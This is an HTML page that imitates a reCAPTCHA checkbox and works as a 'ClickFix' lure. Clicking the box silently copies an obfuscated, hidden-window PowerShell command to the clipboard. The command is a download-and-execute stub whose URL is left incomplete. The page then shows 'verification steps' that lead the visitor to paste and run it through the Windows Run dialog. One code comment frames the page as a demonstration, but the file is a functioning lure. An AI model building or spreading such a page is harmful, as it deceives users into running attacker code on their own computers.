<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>reCAPTCHA</title>
  <style>
    body{font-family:Roboto,Arial,sans-serif;background:#f9f9f9}
    .box{width:300px;margin:120px auto;border:1px solid #d3d3d3;background:#fff;padding:14px;display:flex;align-items:center;gap:12px}
    .recaptcha-checkbox{width:24px;height:24px;border:2px solid #c1c1c1;border-radius:2px;cursor:pointer}
    #steps{display:none;width:420px;margin:20px auto;background:#fff;border:1px solid #ccc;padding:16px}
  </style>
</head>
<body>
  <div class="box">
    <div class="recaptcha-checkbox" id="recaptcha-anchor" role="checkbox" aria-checked="false"></div>
    <span>I'm not a robot</span>
  </div>
  <div id="steps">
    <h3>Verification Steps</h3>
    <ol>
      <li>Press Windows Button "⊞" + R</li>
      <li>Press CTRL + V</li>
      <li>Press Enter</li>
    </ol>
    <p>reCAPTCHA Verification ID: 4821</p>
  </div>
  <script>
    // What a ClickFix kit does: on "verification", copy a hidden PowerShell
    // command with a reassuring trailing comment, then show the steps.
    const payload = "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAJwApAA== # I am not a robot - reCAPTCHA Verification ID: 4821";
    document.getElementById('recaptcha-anchor').addEventListener('click', function () {
      navigator.clipboard.writeText(payload).catch(function () {});
      document.getElementById('steps').style.display = 'block';
    });
  </script>
</body>
</html>
